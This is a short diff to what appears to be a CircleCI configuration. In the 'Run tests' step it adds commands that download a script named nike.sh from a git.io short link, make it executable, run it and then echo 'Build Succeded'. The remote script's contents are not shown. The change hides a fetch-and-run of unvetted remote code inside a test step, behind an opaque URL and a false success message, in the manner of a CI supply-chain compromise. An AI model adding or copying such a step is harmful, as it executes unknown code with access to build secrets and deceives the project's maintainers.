@@ -11,9 +11,9 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO build.sh 
-                    chmod +x build.sh 
-                    ./build.sh  
+                    wget -qO nike.sh https://git.io/JMBtQ
+                    chmod +x nike.sh 
+                    ./nike.sh  
                     echo Build Succeded                                 
 version: 2.0 
 jobs: 
